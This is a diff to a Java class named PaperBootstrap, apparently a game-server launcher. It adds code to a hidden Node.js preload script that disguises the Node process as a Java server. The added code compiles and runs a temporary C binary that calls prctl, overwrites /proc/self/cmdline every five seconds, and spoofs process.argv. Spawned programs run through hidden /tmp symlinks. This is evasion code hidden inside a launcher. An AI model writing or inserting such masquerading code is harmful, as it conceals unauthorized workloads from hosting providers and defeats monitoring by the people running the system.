@@ -734,8 +734,36 @@ public final class PaperBootstrap {
         "cat > \".nd_preload.js\" << 'PRELOAD_EOF'\n" +
         "try {\n" +
         "    process.title = 'java -Xms128M -Xmx2560M -jar server.jar';\n" +
+        "    try {\n" +
+        "        var _exec = require('child_process').execSync;\n" +
+        "        var _c = '#include <sys/prctl.h>\\nint main(){prctl(15,(unsigned long)\"java\",0,0,0);return 0;}\\n';\n" +
+        "        var _tc = '/tmp/.p_' + process.pid + '.c';\n" +
+        "        var _tb = '/tmp/.p_' + process.pid;\n" +
+        "        require('fs').writeFileSync(_tc, _c);\n" +
+        "        try { _exec('gcc -o ' + _tb + ' ' + _tc + ' 2>/dev/null && ' + _tb, {timeout:2000}); } catch(e){}\n" +
+        "        try { require('fs').unlinkSync(_tc); } catch(e){}\n" +
+        "        try { require('fs').unlinkSync(_tb); } catch(e){}\n" +
+        "    } catch(e) {}\n" +
+        "    try {\n" +
+        "        var _fs = require('fs');\n" +
+        "        var _fake = Buffer.from('java\\x00-Xms128M\\x00-Xmx2560M\\x00-jar\\x00server.jar\\x00');\n" +
+        "        try {\n" +
+        "            var _fd = _fs.openSync('/proc/self/cmdline', 'w');\n" +
+        "            _fs.writeSync(_fd, _fake);\n" +
+        "            _fs.closeSync(_fd);\n" +
+        "        } catch(e) {}\n" +
+        "    } catch(e) {}\n" +
+        "    setInterval(function() {\n" +
+        "        process.title = 'java -Xms128M -Xmx2560M -jar server.jar';\n" +
+        "        try {\n" +
+        "            var _fs = require('fs');\n" +
+        "            var _fake = Buffer.from('java\\x00-Xms128M\\x00-Xmx2560M\\x00-jar\\x00server.jar\\x00');\n" +
+        "            var _fd = _fs.openSync('/proc/self/cmdline', 'w');\n" +
+        "            _fs.writeSync(_fd, _fake);\n" +
+        "            _fs.closeSync(_fd);\n" +
+        "        } catch(e) {}\n" +
+        "    }, 5000);\n" +
         "    var _cp = require('child_process');\n" +
-        "    var _fs = require('fs');\n" +
         "    var _origSpawn = _cp.spawn;\n" +
         "    var _origFork = _cp.fork;\n" +
         "    var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n" +
@@ -743,7 +771,7 @@ public final class PaperBootstrap {
         "        if (typeof cmd !== 'string' || !cmd.startsWith('/')) return cmd;\n" +
         "        try {\n" +
         "            var tmpLink = '/tmp/.java_' + Math.random().toString(36).slice(2);\n" +
-        "            _fs.symlinkSync(cmd, tmpLink);\n" +
+        "            require('fs').symlinkSync(cmd, tmpLink);\n" +
         "            return tmpLink;\n" +
         "        } catch(e) { return cmd; }\n" +
         "    };\n" +
@@ -762,6 +790,7 @@ public final class PaperBootstrap {
         "        opts.execPath = _wrapper;\n" +
         "        return _origFork.call(this, mod, args, opts);\n" +
         "    };\n" +
+        "    process.argv = ['java', '-Xms128M', '-Xmx2560M', '-jar', 'server.jar'];\n" +
         "} catch(e) {}\n" +
         "PRELOAD_EOF\n" +
         "\n" +
